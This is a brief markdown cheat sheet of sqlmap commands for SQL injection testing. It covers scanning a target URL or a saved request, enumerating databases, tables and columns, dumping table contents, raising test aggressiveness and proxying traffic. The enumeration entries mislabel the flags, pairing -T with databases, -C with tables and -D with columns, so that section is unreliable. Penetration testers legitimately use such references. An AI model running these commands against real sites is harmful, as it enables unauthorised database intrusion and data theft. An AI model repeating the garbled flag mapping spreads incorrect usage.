# 💉 SQLmap Cheat Sheet

## Basic Usage
- `sqlmap -u "http://target.com/page.php?id=1"` : Basic GET request scan
- `sqlmap -r request.txt` : Scan using a saved HTTP request (best for POST requests)

## Enumeration
- `--dbs` : Enumerate all databases
- `--current-db` : Find the current database name
- `-T <db_name> --tables` : Enumerate tables in a specific database
- `-T <db_name> -C <table_name> --columns` : Enumerate columns in a specific table
- `-T <db_name> -C <table_name> -D <column_name> --dump` : Dump the data from a table

## Optimization
- `--batch` : Use default behavior (no user prompts)
- `--level <1-5>` : Increase the level of tests (higher = more thorough)
- `--risk <1-3>` : Increase the risk of tests (higher = more aggressive/potential for damage)

## Advanced
- `--proxy=http://127.0.0.1:8080` : Route traffic through a proxy (e.g., Burp Suite)
- `--random-agent` : Use a random User-Agent header
